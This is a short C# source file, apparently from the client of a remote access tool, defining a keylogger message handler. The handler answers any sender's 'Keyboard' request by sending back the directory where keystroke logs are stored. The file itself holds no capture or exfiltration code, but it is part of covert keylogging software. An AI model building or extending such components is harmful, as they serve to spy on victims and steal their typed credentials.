using Rouzzf.Client.Config;
using Rouzzf.Common.Messages;
using Rouzzf.Common.Networking;

namespace Rouzzf.Client.Messages
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is Keyboard;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case Keyboard msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, Keyboard message)
        {
            client.Send(new KeyboardResponse {LogsDirectory = Settings.LOGSPATH });
        }
    }
}
